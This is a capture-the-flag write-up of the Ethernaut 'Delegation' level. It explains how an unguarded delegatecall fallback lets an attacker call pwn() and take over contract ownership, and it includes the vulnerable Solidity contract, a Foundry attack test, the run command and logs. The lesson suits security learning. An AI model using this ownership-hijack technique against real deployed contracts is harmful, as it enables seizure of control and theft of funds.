# What is OpenZeppelin Ethernaut?

OpenZeppelin Ethernaut is an educational platform that provides interactive and gamified challenges to help users learn about Ethereum smart contract security. It is developed by OpenZeppelin, a company known for its security audits, tools, and best practices in the blockchain and Ethereum ecosystem.

OpenZeppelin Ethernaut Website: [ethernaut.openzeppelin.com](https://ethernaut.openzeppelin.com/)

<br>

# What You're Supposed to Do?

in `06-Delegation` Challenge, You Should Try To find a Way to Take Ownership of `Delegation` Contract with `delegatecall`.

`06-Delegation` Challenge Link: [https://ethernaut.openzeppelin.com/level/6](https://ethernaut.openzeppelin.com/level/6)

<br>

# How did i Complete This Challenge?

To complete this challenge, you should first understand how `delegatecall` works.

Think of `delegatecall` as borrowing a function from another contract and using it only once before returning it. What you should keep in mind is that when we borrow a function from another contract, we execute it in the context of the calling contract's state. This means the state variables and storage of the contract that made the `delegatecall` will change, not the state variables and storage of the target contract.

Now Lets take a Look At the Codebase:

in `Delegation` Contract We Have an Fallback Function, Which is Executed When a Function that does not exist is called or Ether is sent directly to a contract but `receive()` does not exist or `msg.data` is not empty.

```javascript
    contract Delegation {
        address public owner;
        Delegate delegate;

        constructor(address _delegateAddress) {
            delegate = Delegate(_delegateAddress);
            owner = msg.sender;
        }

        fallback() external {
            (bool result,) = address(delegate).delegatecall(msg.data);
            if (result) {
                this;
            }
        }
    }
```

What Attacker Would Do is trigger the `fallback()` function with `bytes memory data = abi.encodeWithSignature("pwn()");` as `msg.data`.

What Will This Do is, Is Gonna `delegatecall` target Contract `pwn()` function. Basically We Gonna Borrow the `pwn()` function from target Contract and Place it in our Contract, then After
We Executed it, We Gonna Give it Back.

So When the `delegatecall` to target Contract is Made, Our `Delegation` Contract, Looks Like this:

```javascript
    contract Delegation {
        address public owner;
        Delegate delegate;

        constructor(address _delegateAddress) {
            delegate = Delegate(_delegateAddress);
            owner = msg.sender;
        }

        function pwn() public {
            owner = msg.sender;
        }   

        fallback() external {
            (bool result,) = address(delegate).delegatecall(msg.data);
            if (result) {
                this;
            }
        }
    }
```

then We Execute `pwn()` with Context of the `Delegation` Contract and then we Give it Back. 

What `pwn()` function it stores `msg.sender` in `owner` variable. in This Particular Example the `msg.sender` is the One that Triggered the `fallback()` function.

also i Wrote Test For this Attack, it's Called `testtakeOwnerShipOfContractWithDelegateCall` inside the `Delegation.t.sol`:


```javascript
    function testtakeOwnerShipOfContractWithDelegateCall() public {
        vm.startPrank(ownerOfDelegationContract);
        assertEq(ownerOfDelegationContract, delegation.owner());
        console.log("Delegation Contract Owner Address: ", ownerOfDelegationContract);
        console.log("Attacker Address: ", attacker);
        vm.stopPrank();

        vm.startPrank(attacker);
        bytes memory data = abi.encodeWithSignature("pwn()");
        console.log("Current Owner Of Delegation Contract Before the Attack: ", delegation.owner());
        (bool success, ) = address(delegation).call(data);
        require(success, "Low Level Call Failed!");
        console.log("Current Owner Of Delegation Contract Before the Attack: ", delegation.owner());
        assertEq(attacker, delegation.owner());
        vm.stopPrank();
    }
```

You Can Run This Test inside Your Terminal With Following Command:

```javascript
    forge test --match-test testtakeOwnerShipOfContractWithDelegateCall -vvvv
```

Take a Look at the `Logs`:

```javascript
    Logs:
        Delegation Contract Owner Address:  0xf96Fa8Ef1e8D70d88ce300ED942026Fa0270262c
        Attacker Address:  0x9dF0C6b0066D5317aA5b38B36850548DaCCa6B4e
        Current Owner Of Delegation Contract Before the Attack:  0xf96Fa8Ef1e8D70d88ce300ED942026Fa0270262c
        Current Owner Of Delegation Contract Before the Attack:  0x9dF0C6b0066D5317aA5b38B36850548DaCCa6B4e
```

<br>

### i Hope this Made Sense for You, if it doesn't, then i recommend You Read this Two Documents About `delegatecall`:

1. [https://solidity-by-example.org/delegatecall/](https://solidity-by-example.org/delegatecall/)
2. [https://medium.com/@ajaotosinserah/mastering-delegatecall-in-solidity-a-comprehensive-guide-with-evm-walkthrough-6ddf027175c7](https://medium.com/@ajaotosinserah/mastering-delegatecall-in-solidity-a-comprehensive-guide-with-evm-walkthrough-6ddf027175c7)

